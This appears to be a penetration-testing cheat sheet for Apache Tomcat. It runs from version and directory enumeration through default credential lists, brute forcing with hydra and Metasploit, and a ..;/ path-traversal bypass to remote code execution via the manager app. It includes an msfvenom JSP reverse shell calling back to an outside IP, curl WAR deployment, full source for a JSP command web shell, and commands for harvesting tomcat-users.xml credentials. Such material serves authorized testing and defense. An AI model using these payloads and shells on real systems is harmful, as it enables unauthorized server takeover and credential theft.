# Pentest-Tomcat
![](RCE/tom.png)

## Enumeration
### Version
```bash
$ curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 
```
### Directory Discovery
To enumerate directories automatically, use fuzzing tools.
```bash
ffuf -u https://example.com/FUZZ -w directories.txt
ffuf -u https://example.com/host-manager/FUZZ -w 
ffuf -u https://example.com/manager/FUZZ -w directories.txt
```

### Locate manager files
It's interesting to find where are the pages `/manager` and `/host-manager` as they might have a different name. You can search them with a brute-force.

### Username Enum
In some versions prior to Tomcat6 you could enumerate users:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
## Default credentials
```
admin:(empty)
admin:admin
admin:password
admin:password1
admin:Password1
admin:tomcat
manager:manager
root:changethis
root:password
root:password1
root:root
root:r00t
root:toor
tomcat:(empty)
tomcat:admin
tomcat:changethis
tomcat:password
tomcat:password1
tomcat:s3cret
tomcat:tomcat
```
You could test these and more using:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
## Bruteforce
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST tomacat-site.internal
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <IP>
```
### Password backtrace disclosure
Try to access `/auth.jsp` and if you are very lucky it might disclose the password in a backtrace.

The following example scripts that come with Apache Tomcat v4.x - v7.x and can be used by attackers to gain information about the system. 
These scripts are also known to be vulnerable to cross site scripting (XSS) injection
```

    /examples/jsp/num/numguess.jsp
    /examples/jsp/dates/date.jsp
    /examples/jsp/snp/snoop.jsp
    /examples/jsp/error/error.html
    /examples/jsp/sessions/carts.html
    /examples/jsp/checkbox/check.html
    /examples/jsp/colors/colors.html
    /examples/jsp/cal/login.html
    /examples/jsp/include/include.jsp
    /examples/jsp/forward/forward.jsp
    /examples/jsp/plugin/plugin.jsp
    /examples/jsp/jsptoserv/jsptoservlet.jsp
    /examples/jsp/simpletag/foo.jsp
    /examples/jsp/mail/sendmail.jsp
    /examples/servlet/HelloWorldExample
    /examples/servlet/RequestInfoExample
    /examples/servlet/RequestHeaderExample
    /examples/servlet/RequestParamExample
    /examples/servlet/CookieExample
    /examples/servlet/JndiServlet
    /examples/servlet/SessionExample
    /tomcat-docs/appdev/sample/web/hello.jsp
```
### Path Traversal (..;/)
in some vulnerable configuration of tomcat ,you can gain access to protected directories in Tomcat using the path: `/..;/`

So, for example, you might be able to access the Tomcat manager page by accessing: www.vulnerable.com/lalala/..;/manager/html

Another way to bypass protected paths using this trick is to access http://www.vulnerable.com/;param=value/manager/html

## RCE
Finally, if you have access to the Tomcat Web Application Manager, you can upload and deploy a .war file (execute code).

### Metasploit way
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### MSFVenom Reverse Shell
```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```
Then, upload the revshell.war file and access to it (/revshell/)

### Curl Way
```bash

$ curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

$ curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

## Manual method - Web shell
Create `index.jsp` with this content:
```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
now
```bash
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ jar -cvf ../webshell.war *
# webshell.war is created
# Upload it
```

### Other ways to gather Tomcat credentials:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```

### Apache Tomcat - Cross-Site Scripting Scan
```bash
$ nuclei -u target  -t CVE-2019-0221.yaml
```
### Apache Tomcat Remote Command Execution Scan
```bash
$ nuclei -u target  -t CVE-2020-9484.yaml
```

### Investigation From Inside
If we are in the target system, we can retrieve information about credentials.
```bash
find / -name "tomcat-users.xml" 2>/dev/null
cat tomcat-users.xml
```
